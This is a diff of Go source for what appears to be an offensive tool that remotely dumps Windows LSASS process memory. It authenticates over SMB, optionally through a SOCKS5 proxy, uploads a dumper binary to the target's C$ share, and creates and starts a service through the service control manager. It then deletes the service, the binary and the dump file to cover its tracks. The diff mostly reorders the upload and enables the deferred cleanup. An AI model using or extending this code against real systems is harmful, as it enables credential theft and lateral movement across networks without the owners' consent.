@@ -95,11 +95,6 @@ func installService(serviceName, exePath string, args []string) error {
 }
 
 func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string) (err error) {
-	/*
-	   Delete and stop service
-	   Delete svc binary
-	   Delete lsass dmp file
-	*/
 	if session == nil {
 		// Assume a standalone cleanup run
 		session, err = smb.NewConnection(o)
@@ -443,8 +438,6 @@ func main() {
 		}
 	}
 
-	var session *smb.Connection
-
 	if socksIP != "" {
 		dialSocksProxy, err := proxy.SOCKS5("tcp", fmt.Sprintf("%s:%d", socksIP, socksPort), nil, proxy.Direct)
 		if err != nil {
@@ -460,12 +453,6 @@ func main() {
 	} else {
 		session, err = smb.NewConnection(options)
 	}
-	if err != nil {
-		log.Criticalln(err)
-		return
-	}
-
-	session, err = smb.NewConnection(options)
 	if err != nil {
 		log.Criticalln(err)
 		return
@@ -499,18 +486,6 @@ func main() {
 		return
 	}
 
-	//defer cleanup(options, serviceName, svcBinaryPath + svcBinaryName, dumpDir + dumpFileName)
-
-	err = session.PutFile("C$", svcBinaryPath[3:]+svcBinaryName, 0, f.Read)
-	if err != nil {
-		log.Errorf("Failed to upload lsass dumper binary with error: %s\n", err)
-		f.Close()
-		return
-	}
-	f.Close()
-	log.Infof("Successfully uploaded %s to %s%s\n", dumper, svcBinaryPath, svcBinaryName)
-
-	// Create and start service
 	share := "IPC$"
 	err = session.TreeConnect(share)
 	if err != nil {
@@ -526,6 +501,18 @@ func main() {
 	}
 	defer svcctl.CloseFile()
 
+	defer cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName)
+
+	err = session.PutFile("C$", svcBinaryPath[3:]+svcBinaryName, 0, f.Read)
+	if err != nil {
+		log.Errorf("Failed to upload lsass dumper binary with error: %s\n", err)
+		f.Close()
+		return
+	}
+	f.Close()
+	log.Infof("Successfully uploaded %s to %s%s\n", dumper, svcBinaryPath, svcBinaryName)
+
+	// Create and start service
 	bind, err = dcerpc.Bind(svcctl, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
 	if err != nil {
 		log.Errorln("Failed to bind to service")
